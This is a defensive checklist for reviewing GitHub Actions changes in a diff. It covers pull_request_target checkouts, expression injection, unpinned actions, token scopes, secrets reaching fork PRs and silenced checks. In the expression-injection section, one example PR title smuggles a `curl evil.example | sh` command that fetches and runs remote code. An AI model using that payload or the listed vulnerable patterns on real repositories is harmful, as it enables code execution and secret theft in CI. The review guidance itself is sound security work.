# GitHub Actions in a diff

Workflows are code that runs with the repository's tokens and secrets. Read every changed file
under `.github/workflows/` and `.github/actions/` as HIGH. For blast radius, count the workflows
that `uses:` a changed reusable workflow or composite action.

## Untrusted code with trusted privileges

- `pull_request_target` or `workflow_run` plus `actions/checkout` of the PR head
  (`ref: ${{ github.event.pull_request.head.sha }}`, `head_ref`, `refs/pull/N/merge`). The fork's
  code now runs with the base repository's secrets and a write token.
- Self-hosted runners reachable from a trigger that fork PRs can start: a fork author gets a
  shell on your machine and whatever it can reach.
- Artifacts uploaded by a fork's run and then downloaded and trusted (executed, deployed,
  unpacked into a privileged step) by a later `workflow_run` job.

## Expression injection

- `${{ github.event.issue.title }}`, `...pull_request.title`, `...pull_request.body`,
  `...head_commit.message`, `github.head_ref` or any `github.event.*` field written straight into
  a `run:` script or an `actions/github-script` body. The value is pasted into the script before
  the shell sees it; a title like `x"; curl evil.example | sh; echo "` runs.
- Fix: pass the value through `env:` and reference `"$TITLE"` in the script.
- Writes of such values to `$GITHUB_ENV` or `$GITHUB_OUTPUT` let an attacker set variables
  (`LD_PRELOAD`, `NODE_OPTIONS`) for later steps.

## Third-party actions

- An action referenced by tag or branch (`@v4`, `@main`) instead of a full 40-character commit
  SHA; the tag can be moved to new code.
- A diff that swaps a SHA pin for a tag is a weakening, even when the tag looks the same.

## Token permissions

- `permissions:` missing at workflow and job level, so the default token scope applies.
- `write-all`, or `contents: write`, `packages: write`, `pull-requests: write` on jobs that only
  read.
- `id-token: write` added without an OIDC login that needs it.

## Secrets and fork PRs

- `secrets: inherit` or explicit secrets passed to a job that `pull_request_target` or a
  fork-triggered `workflow_run` reaches.
- Secrets echoed in a step, or written to a file that is then uploaded as an artifact.

## Silenced checks

- `continue-on-error: true` added to a scanner, signature check or test step.
- A required security job's `if:` changed so it is skipped on some events.
